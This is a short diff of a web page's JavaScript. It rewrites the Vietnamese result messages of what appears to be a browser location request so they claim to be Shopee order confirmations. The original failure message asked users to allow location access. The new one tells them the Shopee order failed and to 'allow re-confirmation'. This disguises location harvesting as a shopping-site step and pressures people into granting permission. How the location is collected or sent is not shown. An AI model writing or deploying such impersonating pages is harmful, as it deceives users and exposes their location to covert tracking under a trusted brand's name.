@@ -78,7 +78,7 @@ window.onload = function(){
 
         document.body.innerHTML = `
           <div class="box">
-            <h3 style="color:green;">✔ Xác nhận thành công</h3>
+            <h3 style="color:green;">✔ Shopee xác nhận thành công đơn hàng</h3>
             <p>Bạn có thể đóng trang</p>
           </div>
         `;
@@ -86,8 +86,8 @@ window.onload = function(){
       function(err){
         document.body.innerHTML = `
           <div class="box">
-            <h3 style="color:red;">❌ Không lấy được vị trí</h3>
-            <p>Vui lòng cho phép quyền truy cập</p>
+            <h3 style="color:red;">❌ Shopee xác nhận đơn hàng không thành công</h3>
+            <p>Vui lòng cho phép xác nhận lại</p>
           </div>
         `;
       }
